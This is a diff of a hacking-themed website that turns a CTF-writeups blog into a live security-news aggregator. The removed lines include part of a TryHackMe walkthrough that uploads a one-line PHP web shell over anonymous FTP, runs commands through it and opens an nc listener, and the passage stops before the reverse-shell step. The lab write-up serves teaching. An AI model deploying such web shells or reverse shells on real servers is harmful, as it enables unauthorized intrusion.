+.reader-content h2{font-family:var(--disp);font-size:clamp(1.3rem,3.6vw,1.75rem);font-weight:600;color:#fff;margin:44px 0 16px;padding-bottom:8px;border-bottom:1px solid var(--border)}
+.reader-content h2::before{content:'§ ';color:var(--green)}
 .reader-content h3{font-family:var(--disp);font-size:1.15rem;font-weight:600;color:var(--green2);margin:28px 0 12px}
-.reader-content p{margin-bottom:20px;color:var(--text)}
-.reader-content p strong{color:#fff;font-weight:600}
-.reader-content p em{color:var(--green2);font-style:italic}
-.reader-content ul,.reader-content ol{margin-bottom:20px;padding-left:22px;color:var(--text)}
+.reader-content p{margin-bottom:20px}
+.reader-content ul,.reader-content ol{margin-bottom:20px;padding-left:22px}
 .reader-content ul li,.reader-content ol li{margin-bottom:8px;line-height:1.75}
 .reader-content ul{list-style:none;padding-left:0}
 .reader-content ul li{padding-left:22px;position:relative}
 .reader-content ul li::before{content:'▸';position:absolute;left:0;color:var(--green);font-weight:700}
-.reader-content ol{list-style:none;counter-reset:item;padding-left:0}
-.reader-content ol li{padding-left:32px;position:relative;counter-increment:item}
-.reader-content ol li::before{content:counter(item,decimal-leading-zero);position:absolute;left:0;top:0;font-family:var(--mono);font-size:.72rem;font-weight:700;color:var(--green);padding:2px 6px;background:rgba(0,255,65,.08);border:1px solid var(--border);border-radius:4px}
-.reader-content a{color:var(--cyan);text-decoration:underline;text-decoration-color:rgba(0,229,255,.4);text-underline-offset:3px;transition:all .2s}
-.reader-content a:hover{text-decoration-color:var(--cyan);color:var(--green2)}
-.reader-content code{font-family:var(--mono);font-size:.85em;background:rgba(0,255,65,.08);border:1px solid var(--border);padding:2px 6px;border-radius:4px;color:var(--green2);white-space:nowrap}
-.reader-content pre{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;overflow-x:auto;margin:24px 0;position:relative;box-shadow:0 10px 30px rgba(0,0,0,.4)}
+.reader-content a{color:var(--cyan);text-decoration:underline;text-decoration-color:rgba(0,229,255,.4);text-underline-offset:3px}
+.reader-content code{font-family:var(--mono);font-size:.85em;background:rgba(0,255,65,.08);border:1px solid var(--border);padding:2px 6px;border-radius:4px;color:var(--green2)}
+.reader-content pre{background:var(--card);border:1px solid var(--border);border-radius:10px;padding:18px 20px;overflow-x:auto;margin:24px 0;position:relative}
 .reader-content pre::before{content:attr(data-lang);position:absolute;top:8px;right:14px;font-family:var(--mono);font-size:.6rem;color:var(--muted2);letter-spacing:.15em;text-transform:uppercase}
 .reader-content pre code{background:transparent;border:none;padding:0;color:var(--text);font-size:.82rem;line-height:1.7;white-space:pre;display:block}
 .reader-content pre code .c{color:var(--muted2);font-style:italic}
@@ -273,20 +325,15 @@ section{padding:80px 0;position:relative;z-index:2}
 .reader-content .callout.warn{background:rgba(255,176,0,.05);border-color:rgba(255,176,0,.4);border-left-color:var(--amber)}
 .reader-content .callout.danger{background:rgba(255,45,85,.05);border-color:rgba(255,45,85,.4);border-left-color:var(--red)}
 .reader-content .callout-title{font-family:var(--disp);font-weight:700;margin-bottom:8px;display:flex;align-items:center;gap:8px;color:#fff;font-size:.95rem}
-.reader-content .callout p:last-child{margin-bottom:0}
-.reader-content .callout .callout-title i{color:var(--green)}
+.reader-content .callout-title i{color:var(--green)}
 .reader-content .callout.warn .callout-title i{color:var(--amber)}
 .reader-content .callout.danger .callout-title i{color:var(--red)}
 .reader-content table{width:100%;border-collapse:collapse;margin:24px 0;font-size:.85rem;border:1px solid var(--border);border-radius:8px;overflow:hidden}
 .reader-content table th{background:var(--bg3);font-family:var(--mono);font-size:.7rem;letter-spacing:.1em;text-transform:uppercase;color:var(--green);padding:12px 14px;text-align:left;border-bottom:1px solid var(--border)}
-.reader-content table td{padding:11px 14px;border-bottom:1px solid var(--border);color:var(--text);font-size:.85rem}
-.reader-content table tr:last-child td{border-bottom:none}
-.reader-content table tr:hover{background:rgba(0,255,65,.03)}
-.reader-content blockquote{border-left:3px solid var(--cyan);padding:8px 0 8px 20px;margin:24px 0;color:var(--muted);font-style:italic}
-.reader-content hr{border:none;height:1px;background:var(--border);margin:44px 0}
+.reader-content table td{padding:11px 14px;border-bottom:1px solid var(--border);font-size:.85rem}
 .reader-content .tag-row{display:flex;gap:6px;flex-wrap:wrap;margin-top:40px;padding-top:24px;border-top:1px solid var(--border)}
 
-/* FOOTER */
+/* ═══ FOOTER ═══ */
 footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 26px;position:relative;z-index:2}
 .foot-grid{max-width:1280px;margin:0 auto 32px;display:grid;grid-template-columns:1.6fr 1fr 1fr 1.2fr;gap:36px}
 .foot-brand h3{font-family:var(--disp);font-size:1.2rem;color:var(--green);letter-spacing:.1em;margin-bottom:12px;text-shadow:0 0 12px var(--green-glow)}
@@ -309,7 +356,11 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
 
 #toTop{position:fixed;bottom:20px;right:20px;z-index:800;width:44px;height:44px;border-radius:8px;background:var(--card);border:1px solid var(--green);color:var(--green);display:none;align-items:center;justify-content:center;font-size:1rem;cursor:pointer;transition:all .3s;box-shadow:0 0 20px rgba(0,255,65,.2)}
 #toTop.show{display:flex}
-#toTop:hover{background:var(--green);color:#000;transform:translateY(-3px);box-shadow:0 0 30px var(--green-glow)}
+#toTop:hover{background:var(--green);color:#000;transform:translateY(-3px)}
+
+/* ═══ TOAST ═══ */
+#toast{position:fixed;bottom:80px;left:50%;transform:translateX(-50%) translateY(20px);background:var(--card);border:1px solid var(--border2);color:#fff;padding:12px 22px;border-radius:100px;font-family:var(--mono);font-size:.75rem;letter-spacing:.05em;z-index:3000;opacity:0;pointer-events:none;transition:all .3s var(--ease);box-shadow:0 8px 24px rgba(0,0,0,.5);white-space:nowrap;max-width:90vw;overflow:hidden;text-overflow:ellipsis}
+#toast.show{opacity:1;transform:translateX(-50%) translateY(0)}
 
 .rv{opacity:0;transform:translateY(28px);transition:opacity .9s var(--ease),transform .9s var(--ease)}
 .rv.in{opacity:1;transform:translateY(0)}
@@ -326,19 +377,26 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
 
 <div id="pre"><pre id="preText"></pre></div>
 
+<!-- BREAKING NEWS TICKER -->
+<div class="ticker" id="ticker">
+  <div class="ticker-label"><i class="fas fa-circle"></i> LIVE</div>
+  <div class="ticker-track" id="tickerTrack">
+    <span class="ticker-item"><span class="src">THN</span> Loading live cyber news feeds...</span>
+  </div>
+</div>
+
 <!-- NAV -->
 <nav class="nav" id="nav">
   <a href="#home" class="brand">
     <div class="brand-mark">J</div>
-    JOHAN.CICADA
+    HACKING.ARSENAL
   </a>
   <ul class="menu" id="menu">
-    <li><a href="#writeups">Writeups</a></li>
+    <li><a href="#news">Live News</a></li>
     <li><a href="#tools">Tools</a></li>
     <li><a href="#bugbounty">BugBounty</a></li>
     <li><a href="#articles">Articles</a></li>
     <li><a href="#about">About</a></li>
-    <li><a href="#tools" class="cta">Arsenal</a></li>
   </ul>
   <button class="burger" id="burger" aria-label="Menu"><span></span><span></span><span></span></button>
 </nav>
@@ -349,66 +407,97 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
     <div class="hero-in">
       <div>
         <div class="prompt">
-          <span class="u">root</span>@<span class="p">johan-cicada</span>:~$ <span class="c">whoami</span>
+          <span class="u">root</span>@<span class="p">hacking-arsenal</span>:~$ <span class="c">tail -f /var/log/threats.log</span>
         </div>
         <h1 class="h1">
-          Breaking.<br>
-          Writing.<br>
-          <em>Teaching Hacking.</em>
+          Real-Time<br>
+          Cyber Threats.<br>
+          <em>Live Feed.</em>
         </h1>
         <p class="hero-desc">
-          TryHackMe & HTB walkthroughs · <span class="hl">2000+ hacking tools</span> · Bug bounty writeups · Real CTF solutions.
-          <br>
-          Everything you need to go from <span class="cy">zero to red teamer</span>.
+          Aggregating live security intelligence from <span class="hl">The Hacker News</span>, <span class="cy">Krebs on Security</span>, Dark Reading, BleepingComputer and SecurityWeek — refreshed every 5 minutes.
         </p>
         <div class="hero-cta">
-          <a href="#articles" class="btn solid"><i class="fas fa-book-open"></i><span>Read Articles</span></a>
+          <a href="#news" class="btn solid"><i class="fas fa-satellite-dish"></i><span>Live Feed</span></a>
           <a href="#tools" class="btn"><i class="fas fa-toolbox"></i><span>Tool Arsenal</span></a>
         </div>
 
         <div class="stats">
           <div class="stat"><div class="stat-val" data-count="2000">0</div><div class="stat-lbl">Tools Indexed</div></div>
-          <div class="stat"><div class="stat-val" data-count="150">0</div><div class="stat-lbl">Writeups</div></div>
+          <div class="stat"><div class="stat-val" data-count="5">0</div><div class="stat-lbl">Live Sources</div></div>
           <div class="stat"><div class="stat-val" data-count="80">0</div><div class="stat-lbl">Bug Reports</div></div>
           <div class="stat"><div class="stat-val" data-count="45">0</div><div class="stat-lbl">Articles</div></div>
         </div>
       </div>
 
-      <div class="term">
-        <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">johan@cicada ~ /recon/target</span></div>
-        <div class="term-body" id="heroTerm"></div>
+      <div class="live-panel">
+        <div class="live-header">
+          <div class="live-badge"><div class="live-dot"></div> Threat Intel</div>
+          <div class="live-time" id="liveTime">--:--:--</div>
+        </div>
+        <div class="live-stats">
+          <div class="live-stat">
+            <div class="k">Total Articles</div>
+            <div class="v" id="statTotal">—</div>
+            <div class="sub">Last 5 minutes</div>
+          </div>
+          <div class="live-stat">
+            <div class="k">Critical CVEs</div>
+            <div class="v" id="statCVE">—</div>
+            <div class="sub">From feeds</div>
+          </div>
+          <div class="live-stat">
+            <div class="k">Active Sources</div>
+            <div class="v" id="statSources">—</div>
+            <div class="sub">RSS aggregated</div>
+          </div>
+          <div class="live-stat">
+            <div class="k">Last Sync</div>
+            <div class="v" id="statSync" style="font-size:1rem">—</div>
+            <div class="sub">Auto-refresh 5m</div>
+          </div>
+        </div>
       </div>
     </div>
   </div>
 </header>
 
-<div class="mq" aria-hidden="true"><div class="mq-tr" id="mqTrack"></div></div>
-
-<!-- ARTICLES (FEATURED — REAL CONTENT) -->
-<section id="articles">
+<!-- ═══ LIVE NEWS ═══ -->
+<section id="news">
   <div class="wrap">
     <div class="sec-hd c rv">
-      <div class="sec-tag">Articles</div>
-      <h2 class="sec-h">Real Hacking <em>Articles & Writeups</em></h2>
-      <p class="sec-p">Full-length guides based on real vulnerabilities, real CTF rooms and real bug bounty disclosures. Click any card to read.</p>
+      <div class="sec-tag">Threat Intel</div>
+      <h2 class="sec-h">Live Cyber <em>News Feed</em></h2>
+      <p class="sec-p">Real-time security news aggregated from The Hacker News, Krebs on Security, Dark Reading, BleepingComputer and SecurityWeek. Updated every 5 minutes.</p>
     </div>
-    <div class="art-list" id="artGrid"></div>
+
+    <div class="news-controls rv">
+      <div class="news-bar">
+        <div class="news-search">
+          <i class="fas fa-search"></i>
+          <input type="search" id="newsSearch" placeholder="Search headlines... (ransomware, CVE, breach)" autocomplete="off">
+        </div>
+        <button class="refresh-btn" id="refreshBtn">
+          <i class="fas fa-sync-alt"></i> Refresh
+        </button>
+      </div>
+      <div class="news-cats" id="newsCats"></div>
+    </div>
+
+    <div class="news-grid" id="newsGrid"></div>
+
+    <!-- CVE WIDGET -->
+    <div class="cve-widget rv">
+      <div class="cve-head">
+        <h4><i class="fas fa-shield-virus"></i> Critical CVEs Today</h4>
+        <span id="cveUpdated">Live from feeds</span>
+      </div>
+      <div class="cve-list" id="cveList"></div>
+    </div>
   </div>
 </section>
 
-<!-- WRITEUPS -->
-<section id="writeups">
-  <div class="wrap">
-    <div class="sec-hd c rv">
-      <div class="sec-tag">Writeups</div>
-      <h2 class="sec-h">TryHackMe & HTB <em>Walkthroughs</em></h2>
-      <p class="sec-p">Step-by-step solutions for CTF machines and labs. Every writeup includes enumeration, exploitation, privilege escalation and lessons learned.</p>
-    </div>
-    <div class="wgrid" id="writeupGrid"></div>
-  </div>
-</section>
-
-<!-- TOOLS -->
+<!-- ═══ TOOLS ═══ -->
 <section id="tools">
   <div class="wrap">
     <div class="sec-hd c rv">
@@ -427,26 +516,10 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
     </div>
 
     <div class="tgrid" id="toolGrid"></div>
-
-    <div class="cmd-block rv">
-      <div class="cmd-head"><i class="fas fa-terminal"></i> QUICK INSTALL — Kali / Parrot / Termux</div>
-      <div class="cmd-body">
-<span class="c"># Update system</span>
-<span class="g">sudo</span> <span class="w">apt update && sudo apt upgrade -y</span>
-
-<span class="c"># Install core toolkit</span>
-<span class="g">sudo</span> <span class="w">apt install -y nmap sqlmap hydra john hashcat gobuster ffuf wpscan metasploit-framework</span>
-
-<span class="c"># Install Go-based tools</span>
-<span class="g">go</span> <span class="w">install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest</span>
-<span class="g">go</span> <span class="w">install -v github.com/projectdiscovery/httpx/cmd/httpx@latest</span>
-<span class="g">go</span> <span class="w">install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest</span>
-      </div>
-    </div>
   </div>
 </section>
 
-<!-- BUG BOUNTY -->
+<!-- ═══ BUG BOUNTY ═══ -->
 <section id="bugbounty">
   <div class="wrap">
     <div class="sec-hd c rv">
@@ -458,33 +531,45 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
   </div>
 </section>
 
-<!-- ABOUT -->
+<!-- ═══ ARTICLES ═══ -->
+<section id="articles">
+  <div class="wrap">
+    <div class="sec-hd c rv">
+      <div class="sec-tag">Articles</div>
+      <h2 class="sec-h">In-Depth <em>Writeups</em></h2>
+      <p class="sec-p">Full-length technical analysis of real vulnerabilities, real bug bounties and real attack chains.</p>
+    </div>
+    <div class="art-list" id="artGrid"></div>
+  </div>
+</section>
+
+<!-- ═══ ABOUT ═══ -->
 <section id="about">
   <div class="wrap">
     <div class="about-in">
       <div class="about-txt rv">
         <div class="sec-tag">About</div>
-        <h2 class="sec-h" style="margin-bottom:18px">Hey, I'm <em>Johan Cicada</em></h2>
-        <p>I'm a penetration tester, bug hunter and CTF player. This site is where I document everything I learn — walkthroughs, tool setups, vulnerabilities and real bug reports.</p>
-        <p>My goal: help beginners break into cybersecurity without paying thousands of dollars for courses. Everything here is <span class="hl">free, legal and practical</span>.</p>
+        <h2 class="sec-h" style="margin-bottom:18px">Cyber <em>Intelligence Hub</em></h2>
+        <p>Hacking Arsenal aggregates live threat intelligence from five of the most trusted cybersecurity news sources in the world, alongside a curated index of 2000+ offensive security tools.</p>
+        <p>Everything here is <span class="hl">free, legal and educational</span>. The goal is to help security researchers stay current with the threat landscape without scrolling through 20 different sites.</p>
         <div class="about-facts">
-          <div class="fact"><div class="fact-lbl">Focus</div><div class="fact-val">Web & AD Attacks</div></div>
-          <div class="fact"><div class="fact-lbl">Platforms</div><div class="fact-val">THM · HTB · PG</div></div>
-          <div class="fact"><div class="fact-lbl">OS</div><div class="fact-val">Kali · Parrot · Termux</div></div>
-          <div class="fact"><div class="fact-lbl">Motto</div><div class="fact-val">Hack. Learn. Share.</div></div>
+          <div class="fact"><div class="fact-lbl">Focus</div><div class="fact-val">Threat Intel & Tools</div></div>
+          <div class="fact"><div class="fact-lbl">Sources</div><div class="fact-val">5 RSS Feeds</div></div>
+          <div class="fact"><div class="fact-lbl">Refresh</div><div class="fact-val">Every 5 Minutes</div></div>
+          <div class="fact"><div class="fact-lbl">Motto</div><div class="fact-val">Learn. Defend. Share.</div></div>
         </div>
       </div>
 
       <div class="term-about rv d2">
-        <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">~/about/me.txt</span></div>
-        <div class="term-body" style="min-height:auto">
-          <div class="line show"><span class="k">Name:</span><span class="v">Johan Cicada</span></div>
-          <div class="line show"><span class="k">Role:</span><span class="cy">Offensive Security / Bug Hunter</span></div>
-          <div class="line show"><span class="k">Focus:</span><span class="v">Web App · Active Directory · OSINT</span></div>
-          <div class="line show"><span class="k">Tools:</span><span class="v">Burp · Nmap · Metasploit · BloodHound</span></div>
-          <div class="line show"><span class="k">Currently:</span><span class="am">Hunting bounties & writing CTFs</span></div>
-          <div class="line show"><span class="k">Open To:</span><span class="v">Collaboration · Mentoring</span></div>
-          <div class="line show"><span class="k">Motto:</span><span class="pu">HACK THE PLANET 🌍</span></div>
+        <div class="term-bar"><span class="dot r"></span><span class="dot y"></span><span class="dot g"></span><span class="term-title">~/about/hub.txt</span></div>
+        <div class="term-body">
+          <div class="line"><span class="k">Name:</span><span class="v">Hacking Arsenal</span></div>
+          <div class="line"><span class="k">Type:</span><span class="cy">Live Threat Intel Hub</span></div>
+          <div class="line"><span class="k">Sources:</span><span class="v">THN · Krebs · DR · BC · SW</span></div>
+          <div class="line"><span class="k">Update:</span><span class="am">Every 5 minutes (cached)</span></div>
+          <div class="line"><span class="k">Tools:</span><span class="v">2000+ indexed</span></div>
+          <div class="line"><span class="k">License:</span><span class="v">MIT — free to use</span></div>
+          <div class="line"><span class="k">Motto:</span><span class="pu">HACK THE PLANET 🌍</span></div>
         </div>
       </div>
     </div>
@@ -495,31 +580,30 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
 <footer>
   <div class="foot-grid">
     <div class="foot-brand">
-      <h3>JOHAN.CICADA</h3>
-      <p>Hacking writeups, tools and tutorials for the next generation of offensive security researchers.</p>
+      <h3>HACKING.ARSENAL</h3>
+      <p>Live cybersecurity intelligence and a curated arsenal of offensive security tools. Built for researchers, defenders and students.</p>
       <div class="socials">
         <a href="https://github.com/bilnxny" target="_blank" rel="noopener" aria-label="GitHub"><i class="fab fa-github"></i></a>
         <a href="https://instagram.com/bilxnvyy" target="_blank" rel="noopener" aria-label="Instagram"><i class="fab fa-instagram"></i></a>
-        <a href="#" aria-label="TryHackMe"><i class="fas fa-user-secret"></i></a>
-        <a href="#" aria-label="HackTheBox"><i class="fas fa-cube"></i></a>
       </div>
     </div>
     <div class="foot-col">
       <h5>Content</h5>
       <ul>
-        <li><a href="#articles">Articles</a></li>
-        <li><a href="#writeups">Writeups</a></li>
+        <li><a href="#news">Live News</a></li>
         <li><a href="#tools">Tools</a></li>
         <li><a href="#bugbounty">Bug Bounty</a></li>
+        <li><a href="#articles">Articles</a></li>
       </ul>
     </div>
     <div class="foot-col">
-      <h5>Resources</h5>
+      <h5>Sources</h5>
       <ul>
-        <li><a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a></li>
-        <li><a href="https://hackthebox.com" target="_blank" rel="noopener">HackTheBox</a></li>
-        <li><a href="https://portswigger.net/web-security" target="_blank" rel="noopener">PortSwigger</a></li>
-        <li><a href="https://owasp.org" target="_blank" rel="noopener">OWASP</a></li>
+        <li><a href="https://thehackernews.com" target="_blank" rel="noopener">The Hacker News</a></li>
+        <li><a href="https://krebsonsecurity.com" target="_blank" rel="noopener">Krebs on Security</a></li>
+        <li><a href="https://www.darkreading.com" target="_blank" rel="noopener">Dark Reading</a></li>
+        <li><a href="https://www.bleepingcomputer.com" target="_blank" rel="noopener">BleepingComputer</a></li>
+        <li><a href="https://www.securityweek.com" target="_blank" rel="noopener">SecurityWeek</a></li>
       </ul>
     </div>
     <div class="foot-col">
@@ -534,14 +618,14 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
   </div>
 
   <div class="credit-line">
-    <span>© <span id="year"></span> Johan Cicada · All content for educational purposes only.</span>
+    <span>© <span id="year"></span> Hacking Arsenal · News aggregated from public RSS feeds · All content for educational purposes only.</span>
     <span class="made">Created with <i class="fas fa-heart heart"></i> by <a href="https://github.com/bilnxny" target="_blank" rel="noopener">Bilal</a> · <a href="https://instagram.com/bilxnvyy" target="_blank" rel="noopener">@bilxnvyy</a></span>
   </div>
 </footer>
 
 <button id="toTop" aria-label="Top"><i class="fas fa-arrow-up"></i></button>
 
-<!-- ═══ ARTICLE READER MODAL ═══ -->
+<!-- ARTICLE READER -->
 <div class="reader" id="reader">
   <div class="reader-bar">
     <button class="reader-back" id="readerBack"><i class="fas fa-arrow-left"></i> Back</button>
@@ -554,9 +638,11 @@ footer{background:var(--bg2);border-top:1px solid var(--border);padding:56px 5% 
   </div>
 </div>
 
+<div id="toast"></div>
+
 <script>
 /* ═══════════════════════════════════════════════
-   JOHAN CICADA — HACKING ARTICLES WEBSITE
+   HACKING ARSENAL — LIVE NEWS + TOOLS
    ═══════════════════════════════════════════════ */
 
 const $ = id => document.getElementById(id);
@@ -566,16 +652,16 @@ document.getElementById('year').textContent = new Date().getFullYear();
 (function(){
   const out = $('preText');
   const lines = [
-    {t:'[  OK  ] ',c:'ok',m:'Initializing shell...'},
-    {t:'[  OK  ] ',c:'ok',m:'Loading kernel modules...'},
-    {t:'[  OK  ] ',c:'ok',m:'Mounting /dev/johan-cicada...'},
-    {t:'[  OK  ] ',c:'ok',m:'Connecting to tools database...'},
-    {t:'[  OK  ] ',c:'ok',m:'Fetching CTF writeups...'},
-    {t:'[ WARN ] ',c:'warn',m:'Firewall detected — probing ports...'},
-    {t:'[  OK  ] ',c:'ok',m:'Handshake complete.'},
-    {t:'[ GRANT] ',c:'grant',m:'ACCESS GRANTED'},
+    {t:'[  OK  ] ',c:'ok',m:'Initializing threat intel engine...'},
+    {t:'[  OK  ] ',c:'ok',m:'Connecting to RSS feed aggregator...'},
+    {t:'[  OK  ] ',c:'ok',m:'Sources: THN · Krebs · DR · BC · SW'},
+    {t:'[  OK  ] ',c:'ok',m:'Loading tools database (2000+ entries)...'},
+    {t:'[ WARN ] ',c:'warn',m:'Establishing encrypted proxy tunnel...'},
+    {t:'[  OK  ] ',c:'ok',m:'CORS bypass active.'},
+    {t:'[  OK  ] ',c:'ok',m:'Parsing XML feeds...'},
+    {t:'[ GRANT] ',c:'grant',m:'LIVE FEED READY'},
     {t:'',c:'',m:''},
-    {t:'',c:'',m:'> Welcome to Johan Cicada.'},
+    {t:'',c:'',m:'> Welcome to Hacking Arsenal.'},
   ];
   let i=0, buf='';
   function step(){
@@ -584,21 +670,20 @@ document.getElementById('year').textContent = new Date().getFullYear();
       buf += '<span class="'+L.c+'">'+L.t+'</span>'+L.m+'\n';
       out.innerHTML = buf + '<span class="cursor"></span>';
       i++;
-      setTimeout(step, 160 + Math.random()*120);
+      setTimeout(step, 140 + Math.random()*100);
     } else {
-      setTimeout(()=>$('pre').classList.add('out'), 500);
+      setTimeout(()=>$('pre').classList.add('out'), 400);
     }
   }
-  setTimeout(step, 200);
+  setTimeout(step, 180);
   $('pre').addEventListener('click', ()=>$('pre').classList.add('out'));
-  setTimeout(()=>$('pre').classList.add('out'), 4200);
+  setTimeout(()=>$('pre').classList.add('out'), 3600);
 })();
 
-/* ═══ MATRIX RAIN ═══ */
+/* ═══ MATRIX ═══ */
 (function(){
-  const c = $('matrix');
-  const ctx = c.getContext('2d');
-  const glyphs = 'アィウェオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン0123456789ABCDEF<>{}[]()/\\|=+*&^%$#@!';
+  const c = $('matrix'), ctx = c.getContext('2d');
+  const glyphs = 'アィウェオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン0123456789ABCDEF<>{}[]/\\|=+*&^%$#@!';
   const size = 14;
   let cols = 0, drops = [];
   function resize(){
@@ -625,6 +710,17 @@ document.getElementById('year').textContent = new Date().getFullYear();
   setInterval(draw, 60);
 })();
 
+/* ═══ TOAST ═══ */
+let toastTimer;
+function toast(msg, type='info'){
+  const t = $('toast');
+  t.textContent = msg;
+  t.style.borderColor = type === 'error' ? 'var(--red)' : type === 'success' ? 'var(--green)' : 'var(--border2)';
+  t.classList.add('show');
+  clearTimeout(toastTimer);
+  toastTimer = setTimeout(()=>t.classList.remove('show'), 2600);
+}
+
 /* ═══ NAV ═══ */
 const nav = $('nav');
 window.addEventListener('scroll', ()=>{
@@ -644,1006 +740,433 @@ menu.querySelectorAll('a').forEach(a=>a.addEventListener('click', ()=>{
   document.body.classList.remove('locked');
 }));
 
-/* ═══ HERO TERMINAL ═══ */
+/* ═══ LIVE CLOCK ═══ */
 (function(){
-  const el = $('heroTerm');
-  const lines = [
-    {k:'$', v:'nmap -sV -A target.johan.cicada', c:''},
-    {k:'', v:'Starting Nmap 7.94 ( https://nmap.org )', c:'c'},
-    {k:'PORT', v:'22/tcp  open  ssh      OpenSSH 8.2p1', c:'cy'},
-    {k:'PORT', v:'80/tcp  open  http     Apache httpd 2.4.41', c:'cy'},
-    {k:'PORT', v:'443/tcp open  ssl/http nginx 1.18.0', c:'cy'},
-    {k:'PORT', v:'8009/tcp open ajp13   Apache Jserv (Ghostcat?)', c:'cy'},
-    {k:'$', v:'ffuf -u https://target/FUZZ -w wordlist.txt', c:''},
-    {k:'200', v:'/admin', c:'g'},
-    {k:'200', v:'/api/v1/users', c:'g'},
-    {k:'301', v:'/backup.zip', c:'am'},
-    {k:'$', v:'searchsploit tomcat ajp', c:''},
-    {k:'CVE', v:'CVE-2020-1938 — Ghostcat LFI/RCE (Critical)', c:'rd'},
-    {k:'$', v:'cat /root/root.txt', c:''},
-    {k:'>', v:'THM{y0u_f0und_th3_fl4g}', c:'pu'},
-    {k:'', v:'[+] Access granted. Happy hacking.', c:'g'},
-  ];
-  let i = 0;
-  function push(){
-    if (i >= lines.length) return;
-    const L = lines[i];
-    const div = document.createElement('div');
-    div.className = 'line';
-    const kCls = L.c ? L.c : 'k';
-    div.innerHTML = '<span class="'+kCls+'">'+L.k+'</span><span class="'+((L.c==='g'||L.c==='pu')?'v':'')+'">'+L.v+'</span>';
-    el.appendChild(div);
-    requestAnimationFrame(()=>div.classList.add('show'));
-    i++;
-    setTimeout(push, 320);
+  function tick(){
+    const d = new Date();
+    const h = String(d.getHours()).padStart(2,'0');
+    const m = String(d.getMinutes()).padStart(2,'0');
+    const s = String(d.getSeconds()).padStart(2,'0');
+    $('liveTime').textContent = h + ':' + m + ':' + s;
   }
-  setTimeout(push, 1600);
-})();
-
-/* ═══ MARQUEE ═══ */
-(function(){
-  const items = ['TryHackMe','HackTheBox','Bug Bounty','OSINT','Red Team','Active Directory','Web Exploitation','Privilege Escalation','Reverse Engineering','Forensics','Malware Analysis','WiFi Hacking'];
-  const track = $('mqTrack');
-  const html = items.map(t=>'<div class="mq-it">'+t+'</div>').join('');
-  track.innerHTML = html + html;
+  tick();
+  setInterval(tick, 1000);
 })();
 
 /* ═══════════════════════════════════════════════
-   REAL ARTICLES — FULL CONTENT
+   LIVE NEWS FEED — REAL RSS SOURCES
    ═══════════════════════════════════════════════ */
-const ARTICLES = [
-  {
-    id:'spice-hut-thm',
-    n:'01',
-    t:'TryHackMe — Spice Hut Full Walkthrough',
-    d:'Anonymous FTP to root via PwnKit. Complete exploitation chain on an easy Linux box.',
-    tags:['TryHackMe','Linux','FTP','PwnKit'],
-    time:'18 min',
-    diff:'easy',
-    plat:'thm',
-    content:`
-<h1>TryHackMe — Spice Hut Full Walkthrough</h1>
-<div class="article-meta">
-  <span><i class="fas fa-cube"></i> TryHackMe</span>
-  <span><i class="fas fa-signal"></i> Easy</span>
-  <span><i class="fas fa-linux"></i> Linux</span>
-  <span><i class="fas fa-clock"></i> 18 min read</span>
-</div>
 
-<p><strong>Spice Hut</strong> is a beginner-friendly Linux box that demonstrates a classic three-stage attack chain: misconfigured FTP service → file upload → remote code execution → privilege escalation via a known local vulnerability. If you're new to CTFs, this is the ideal box to learn the fundamentals of enumeration and chaining exploits.</p>
-
-<div class="callout">
-  <div class="callout-title"><i class="fas fa-info-circle"></i> Lab Details</div>
-  <p><strong>Target IP:</strong> 10.113.138.124 · <strong>Platform:</strong> TryHackMe · <strong>Difficulty:</strong> Easy · <strong>Objective:</strong> Gain root and capture user + root flags.</p>
-</div>
-
-<h2>Reconnaissance</h2>
-<p>Every engagement begins with enumeration. We start with a standard Nmap scan to identify open ports and running services:</p>
-
-<pre data-lang="bash"><code><span class="g">nmap</span> <span class="w">-sC -sV 10.113.138.124</span></code></pre>
-
-<p>Three ports are open:</p>
-
-<table>
-  <tr><th>Port</th><th>Service</th><th>Note</th></tr>
-  <tr><td>21</td><td>FTP</td><td>Anonymous login allowed + writable</td></tr>
-  <tr><td>22</td><td>SSH</td><td>—</td></tr>
-  <tr><td>80</td><td>HTTP</td><td>—</td></tr>
-</table>
-
-<p><strong>Key insight:</strong> The FTP service allows anonymous login AND has a writable directory. That means we can upload any file we want, and if that directory is served by the web server on port 80, we have a path to code execution.</p>
-
-<h2>Initial Access — FTP Exploitation</h2>
-<p>Let's connect and confirm the misconfiguration:</p>
-
-<pre data-lang="bash"><code><span class="g">ftp</span> <span class="w">10.113.138.124</span>
-<span class="c"># Username: anonymous</span>
-<span class="c"># Password: anonymous</span></code></pre>
-
-<p>After connecting, list the directories and find a writable folder. Once identified, upload a simple PHP web shell:</p>
-
-<pre data-lang="php"><code><span class="cy">&lt;?php</span> system($_GET[<span class="am">'cmd'</span>]); <span class="cy">?&gt;</span></code></pre>
-
-<pre data-lang="bash"><code><span class="g">put</span> <span class="w">shell.php</span></code></pre>
-
-<h2>Remote Code Execution</h2>
-<p>Access the uploaded shell through the web server:</p>
-
-<pre data-lang="bash"><code><span class="w">http://10.113.138.124/files/ftp/shell.php?cmd=id</span></code></pre>
-
-<p>The response confirms we're running commands as the web user:</p>
-
-<pre data-lang="output"><code><span class="g">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre>
-
-<p>Command execution confirmed. Let's turn this into an interactive shell.</p>
-
-<h2>Reverse Shell</h2>
-<p>First, start a listener on your attack machine:</p>
-
-<pre data-lang="bash"><code><span class="g">nc</span> <span class="w">-lvnp 4444</span></code></pre>
-
-<p>Then trigger a reverse shell through the webshell:</p>
-
